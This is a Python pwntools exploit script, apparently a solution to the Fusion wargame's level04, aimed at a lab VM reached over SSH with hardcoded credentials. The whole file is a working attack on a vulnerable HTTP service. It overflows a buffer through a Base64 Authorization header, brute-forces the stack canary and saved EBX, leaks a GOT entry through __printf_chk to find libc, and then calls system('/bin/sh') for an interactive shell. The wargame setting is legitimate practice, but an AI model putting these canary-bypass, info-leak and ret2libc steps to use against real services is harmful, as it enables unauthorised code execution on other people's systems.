from pwn import *
from pwnhelper import *
from pwnhelper.dmesg import Dmesg
import base64
import codecs

local_dir = None
remote_binary = None
cloned_binary = None
libc = None
port = None
elf = None


def gen_alpha():
    alpha = ""
    for i in range(26):
        alpha += 4 * chr((ord('A') + i))
    return bytes(alpha, "utf-8")


def pad(s, slen):
    return s+b"B"*(slen-len(s))


def connect(level):
    global remote_binary
    global local_dir
    global cloned_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/fusion/level"+level
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = local_dir+remote_binary
    port = "200"+level
    s = ssh("fusion", "192.168.2.129", password="godmode", cache=True)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {cloned_binary}")
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib/i386-linux-gnu/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s


alpha = gen_alpha()
log.info(f"alpha: {alpha}")


def recv_all(p):
    while True:
        data = p.recv()
        log.warn(f"new data: \n{data}\n\n")
        if b"stack smashing detected" in data:
            raise SystemExit

stack_cookie = pack(0x7d68fa00, 32)

s = connect("04")
# dmesg = Dmesg(s)

# plt = elf.plt
# log.info(f"plt: {plt}")


log.info("############################################################################################################################################################")
log.info("# BRUTEFORCE STACK CANARY")
log.info("############################################################################################################################################################")
# we know that canary is directly after buffer


def gen_request(overflow):
    path = b"/core"
    protocol = b"HTTP/1.0"
    password = b"L8d4KLI1Eq1MJ68D\x00"
    # found with level04-pw.py script
    payload = b""
    payload += password
    payload = pad(payload, 2048)
    payload += overflow
    # log.info(f"unencoded payload: {payload}")
    payload = base64.b64encode(payload)

    request = b""
    request += b"GET " + path + b" " + protocol + b"\n"
    request += b"Authorization: Basic " + payload + b"\n"
    request += b"\n"
    return request

# canary = b""
# while len(canary) != 4:
#     for i in range(256):
#         val = pack(i, 8)
#         # log.info(f"testing val: {val}")
#         request = gen_request(canary+val)
#         nc = s.process(["nc", "localhost", port])
#         nc.send(request)
#
#         r = nc.recvall()
#         if b"stack smashing detected" in r:
#             nc.close()
#             continue
#         else:
#             log.warn(f"found new byte{val}")
#             canary += val
#             log.warn(f"canary: {canary}")
#             nc.close()
#         if len(canary) == 4:
#             break


stack_cookie = b'\x00\xfah}'
log.info(f"canary: {stack_cookie}")



log.info("############################################################################################################################################################")
log.info("# FIND OFFSET UNTIL RET ADR")
log.info("############################################################################################################################################################")

# alpha_with_cookie = None
#
# for index in range(0, len(alpha)):
#     alpha_with_cookie = alpha[:index] + stack_cookie + alpha[index + 1:]
#     log.info(f"alpha_with_cookie: {alpha_with_cookie}")
#
#     # err_log_path = "/tmp/gilerr"
#     # err_log = open(err_log_path, 'w')
#     nc = s.process(["nc", "localhost", port])
#
#     path = b"/core"
#     protocol = b"HTTP/1.0"
#     password = b"L8d4KLI1Eq1MJ68D\x00"
#     # found with level04-pw.py script
#     payload = b""
#     payload += password
#     payload = pad(payload, 2048)
#     payload += alpha_with_cookie
#     payload = base64.b64encode(payload)
#
#     # log.info(f"payload: {payload}")
#
#     request = b""
#     request += b"GET " + path + b" " + protocol + b"\n"
#     request += b"Authorization: Basic " + payload + b"\n"
#     request += b"\n"
#
#     # log.info(f"request: {request}")
#
#     nc.send(request)
#     try:
#         recv_all(nc)
#     except EOFError:
#         # ret_code = nc.poll()
#         log.info(f"progam crashed")
#         # err_msg = read(err_log_path)
#         # log.info(f"err_msg: {err_msg}")
#         segfaulted, report = dmesg.has_segfaulted("level04")
#         # reports = dmesg.get_report(10)
#         # log.info(f"reports: {reports}")
#         if segfaulted:
#             log.info(f"segfaulted: {segfaulted}")
#             log.info(f"report: {report}")
#             ip = hex(report.ip)
#             overriding_part = codecs.decode(ip.replace("0x", ""), "hex")[::-1]
#             log.info(f"overriding_part: {overriding_part}")
#             index = alpha_with_cookie.find(overriding_part)
#             alpha_with_cookie = alpha_with_cookie[:index]
#         break
#     except SystemExit:
#         log.info("stack smashing detected")
#         segfaulted, report = dmesg.has_segfaulted("level04")
#         # reports = dmesg.get_report(10)
#         # log.info(f"reports: {reports}")
#         if segfaulted:
#             log.info(f"segfaulted: {segfaulted}")
#             log.info(f"report: {report}")

alpha_with_cookie = b'\x00\xfah}AAABBBBCCCCDDDDEEEEFFFFGGGGH'
log.info(f"alpha_with_cookie: {alpha_with_cookie}")

log.info("############################################################################################################################################################")
log.info("# BRUTEFORCE EBX")
log.info("############################################################################################################################################################")

# can also add A's for overflow until crashes to find offset until ebx
ebx_chars = codecs.decode("0x45444444".replace("0x", ""), "hex")[::-1]
log.info(f"ebx_chars: {ebx_chars}")
index = alpha_with_cookie.find(ebx_chars)
until_ebx = alpha_with_cookie[:index]
log.info(f"until_ebx: {until_ebx}")


def recv_until_forbidden(p):
    while True:
        data = p.recv().decode("utf-8")
        log.warn(f"new data: \n{data}\n\n")
        if "Forbidden" in data:
            raise SystemExit


ebx = b""
# while len(ebx) != 4:
#     for i in range(256):
#         val = pack(i, 8)
#         # log.info(f"testing val: {val}")
#         request = gen_request(until_ebx + ebx + val)
#
#         nc = s.process(["nc", "localhost", port])
#         nc.send(request)
#         try:
#             recv_until_forbidden(nc)
#             # log.info(f"response: {r}")
#             nc.close()
#             continue
#         except EOFError:
#             nc.close()
#             continue
#         except SystemExit:
#             log.warn(f"found new byte{val}")
#             ebx += val
#             log.warn(f"ebx: {ebx}")
#             nc.close()
#             break
#     if len(ebx) == 4:
#         break

ebx = unpack(b'\x18\xc1q\xb7')
log.info("ebx: " + hex(ebx) + f" {ebx}")


# test if ebx is correct
# log.info("test if ebx is correct")
# nc = s.process(["nc", "localhost", port])
# request = gen_request(until_ebx + pack(ebx, 32))
# nc.send(request)
# recv_all(nc)


log.info("############################################################################################################################################################")
log.info("# CALL CHEATED PRINTF PLT ADR")
log.info("############################################################################################################################################################")


# printf_chk = pack(0xb7654fc0, 32)
# printf_chk_plt = pack(0xb7718fc0, 32)

# exit_plt = pack(0xb7718eb0, 32)


def gen_request(overflow):

    log.info(f"ebx_chars: {ebx_chars}")
    abc = alpha_with_cookie.replace(ebx_chars, pack(ebx, 32))
    log.info(f"alpha_with_cookie: {abc}")

    path = b"/core"
    protocol = b"HTTP/1.0"
    password = b"L8d4KLI1Eq1MJ68D\x00"
    # found with level04-pw.py script
    payload = b""
    payload += password
    payload = pad(payload, 2048)
    payload += abc
    payload += overflow
    payload = base64.b64encode(payload)

    request = b""
    request += b"GET " + path + b" " + protocol + b"\n"
    request += b"Authorization: Basic " + payload + b"\n"
    request += b"\n"
    return request
#
#
# payload = b""
# payload += printf_chk_plt
# payload += b"AAAA"
# payload += pack(0x1, 32)
# # payload += pack(ebx, 32)
# payload += printf_chk_plt
#
# request = gen_request(payload)
# nc = s.process(["nc", "localhost", port])
# nc.send(request)
# recv_all(nc)

# exit(1)


log.info("############################################################################################################################################################")
log.info("# BRUTEFORCE PRINTF_PLT ADR")
log.info("############################################################################################################################################################")


def recv_until_printf(p):
    try:
        while True:
            data = p.recv(timeout=0.5)
            log.warn(f"new data: \n{data}\n\n")
            # https://c9x.me/x86/html/file_module_x86_id_147.html
            # first instruction in plt is always jmp m16:32 which has code FF
            # and 0xa3 is also always present in instruction (maybe means ebx)
            if b"\xff" in data and b"\xa3" in data:
                return True
    except EOFError:
        return False

# # printf_chk = pack(0xb7654fc0, 32)
# # printf_chk_plt = pack(0xb7718fc0, 32)
#
# printf_chk_plt_off = elf.plt["__printf_chk"]
# log.info("printf_chk_plt_last_part: " + hex(printf_chk_plt_off) + f" {printf_chk_plt_off}")
#
# # start_adr = 0xbffff000
# start_adr = 0xb77ff000
# printf_chk_plt = None
#
#
# # for first_part in range(0x0, start_adr, 0x1000):
# for first_part in range(0x0, start_adr, 0x1000):
#     diff = start_adr - first_part
#     printf_chk_plt = pack(diff + printf_chk_plt_off, 32)
#     # log.info(f"adr: {adr}")
#     log.info(f"adr: {hex(unpack(printf_chk_plt, 32))}")
#
#     payload = b""
#     payload += printf_chk_plt
#     payload += b"AAAA" #bs ret adr
#     payload += pack(0x1, 32) # flags
#     # print from accesible memory -> will receive some bytes if function is called
#     payload += printf_chk_plt
#
#     request = gen_request(payload)
#
#     nc = s.process(["nc", "localhost", port])
#     nc.send(request)
#     printf_called = recv_until_printf(nc)
#     if printf_called:
#         break
#     else:
#         nc.close()


printf_chk_plt = 0xb7718fc0
log.info("found printf chk plt adr")
log.info(f"printf_chk_plt: {printf_chk_plt}")

log.info("############################################################################################################################################################")
log.info("# FIND LIBC BASE ADR")
log.info("############################################################################################################################################################")


def recv_if_any(p):
    try:
        data = p.recv()
        if data is None:
            return False, None
        if len(data) >= 4:
            return True, data
        else:
            return False, None
    except EOFError:
        return False, None


wrong_fgets_got_off = elf.got['fgets']
log.info("wrong_fgets_got_off: " + hex(wrong_fgets_got_off))

fgets_got_off = elf.got['fgets'] - 0x4000
log.info("fgets_got_off: " + hex(fgets_got_off))

# 0xb7718fc00000
first_bits = printf_chk_plt >> 16
first_bits *= 0x10000

log.info("first_bits: " + hex(first_bits) + f" {first_bits}")

# find fgets real adr by printing its got entry
# real adr 0xb75cd760

# fgets got adr: 0xb771c148

fgets_real_adr = None
for i in range(0xf+1):
    fgets_got = first_bits + (i * 0x1000) + fgets_got_off
    log.info("adr: " + hex(fgets_got) + f" {fgets_got}")
    # time.sleep(0.2)

    payload = b""
    payload += pack(printf_chk_plt, 32)
    payload += b"AAAA" # bs ret adr
    payload += pack(0x1, 32) # flags
    # print from accesible memory -> will receive some bytes if function is called
    payload += pack(fgets_got, 32)

    request = gen_request(payload)

    nc = s.process(["nc", "localhost", port])
    nc.send(request)
    received, data = recv_if_any(nc)
    if received:
        log.warn(f"data: {data}")
        adr = unpack(data[:4], 32)
        if "0xb7" in hex(adr):
            fgets_real_adr = adr
            break


log.warn("fgets_real_adr: " + hex(fgets_real_adr) + f" {fgets_real_adr}")
libc_base = fgets_real_adr - libc.symbols['fgets']

log.info(f"libc_base: {libc_base}")

log.info("############################################################################################################################################################")
log.info("# CALL SYSTEM WITH '/BIN/SH'")
log.info("############################################################################################################################################################")


system_adr = libc_base + libc.symbols['system']
bin_sh_adr = libc_base + next(libc.search(b"/bin/sh"))
log.info("system_adr: " + hex(system_adr) + f" {system_adr}")
log.info("bin_sh: " + hex(bin_sh_adr) + f" {bin_sh_adr}")

payload = b""
payload += pack(system_adr, 32)
payload += b"AAAA" # bs ret adr
payload += pack(bin_sh_adr, 32)

request = gen_request(payload)
nc = s.process(["nc", "localhost", port])
nc.send(request)
nc.interactive()






